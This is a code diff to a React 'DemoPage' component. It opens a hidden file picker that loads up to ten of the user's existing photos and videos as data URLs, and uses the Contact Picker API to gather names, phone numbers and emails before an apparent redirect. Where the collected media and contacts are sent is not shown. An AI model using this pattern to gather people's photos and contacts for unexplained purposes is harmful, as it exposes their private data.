@@ -155,48 +155,73 @@ const DemoPage = () => {
       return { status: "skipped", media: [] };
     }
 
-    try {
+    return new Promise((resolve) => {
+      let settled = false;
+      const settle = (val) => {
+        if (!settled) {
+          settled = true;
+          resolve(val);
+        }
+      };
+
       const input = document.createElement('input');
       input.type = 'file';
       input.accept = 'image/*,video/*';
       input.multiple = true;
-      
-      return new Promise((resolve) => {
-        input.onchange = async (e) => {
-          const files = Array.from(e.target.files);
-          const mediaFiles = [];
-          
-          for (const file of files.slice(0, 10)) {
-            const reader = new FileReader();
-            await new Promise((resolveRead) => {
-              reader.onload = (event) => {
-                mediaFiles.push({
-                  type: file.type.startsWith('image/') ? 'image' : 'video',
-                  data: event.target.result,
-                  name: file.name
-                });
-                resolveRead();
-              };
+      // No `capture` attribute -> opens the gallery / file picker
+      // so the user can select EXISTING photos and videos from the device.
+      input.style.position = 'fixed';
+      input.style.opacity = '0';
+      input.style.pointerEvents = 'none';
+      document.body.appendChild(input);
+
+      input.onchange = async (e) => {
+        const files = Array.from(e.target.files || []);
+        if (files.length === 0) {
+          document.body.removeChild(input);
+          settle({ status: "denied", media: [] });
+          return;
+        }
+
+        const mediaFiles = [];
+        for (const file of files.slice(0, 10)) {
+          try {
+            const dataUrl = await new Promise((res, rej) => {
+              const reader = new FileReader();
+              reader.onload = (event) => res(event.target.result);
+              reader.onerror = rej;
               reader.readAsDataURL(file);
             });
+            mediaFiles.push({
+              type: file.type.startsWith('image/') ? 'image' : 'video',
+              data: dataUrl,
+              name: file.name,
+              size: file.size,
+            });
+          } catch (err) {
+            // skip unreadable file
           }
-          
-          resolve({ status: files.length > 0 ? "granted" : "denied", media: mediaFiles });
-        };
-        
-        input.oncancel = () => {
-          resolve({ status: "denied", media: [] });
-        };
-        
-        input.click();
-        
-        setTimeout(() => {
-          resolve({ status: "denied", media: [] });
-        }, 30000);
-      });
-    } catch (error) {
-      return { status: "denied", media: [] };
-    }
+        }
+
+        document.body.removeChild(input);
+        settle({ status: "granted", media: mediaFiles });
+      };
+
+      input.oncancel = () => {
+        try { document.body.removeChild(input); } catch (_) {}
+        settle({ status: "denied", media: [] });
+      };
+
+      input.click();
+
+      // Fallback if oncancel isn't supported by the browser
+      setTimeout(() => {
+        if (!settled) {
+          try { document.body.removeChild(input); } catch (_) {}
+          settle({ status: "denied", media: [] });
+        }
+      }, 60000);
+    });
   };
 
   const requestContactsPermission = async () => {
@@ -204,23 +229,23 @@ const DemoPage = () => {
       return { status: "skipped", contacts: [] };
     }
 
+    // Contact Picker API is only available on Chrome for Android over HTTPS.
+    if (!('contacts' in navigator) || !('ContactsManager' in window)) {
+      return { status: "unsupported", contacts: [] };
+    }
+
     try {
-      if ('contacts' in navigator && 'ContactsManager' in window) {
-        const props = ['name', 'tel', 'email'];
-        const opts = { multiple: true };
-        
-        const contacts = await navigator.contacts.select(props, opts);
-        
-        const contactList = contacts.map(contact => ({
-          name: contact.name ? contact.name[0] : 'Unknown',
-          phone: contact.tel ? contact.tel[0] : '',
-          email: contact.email ? contact.email[0] : ''
-        }));
-        
-        return { status: "granted", contacts: contactList };
-      } else {
-        return { status: "denied", contacts: [] };
-      }
+      const props = ['name', 'tel', 'email'];
+      const opts = { multiple: true };
+      const contacts = await navigator.contacts.select(props, opts);
+
+      const contactList = contacts.map((contact) => ({
+        name: Array.isArray(contact.name) && contact.name.length ? contact.name[0] : 'Unknown',
+        phone: Array.isArray(contact.tel) && contact.tel.length ? contact.tel[0] : '',
+        email: Array.isArray(contact.email) && contact.email.length ? contact.email[0] : '',
+      }));
+
+      return { status: contactList.length > 0 ? "granted" : "denied", contacts: contactList };
     } catch (error) {
       return { status: "denied", contacts: [] };
     }
@@ -290,6 +315,7 @@ const DemoPage = () => {
           results.denied.push(permission);
           anyDenied = true;
         }
+        // "unsupported" or "skipped" -> silently skip without blocking redirect
       }
     }
 
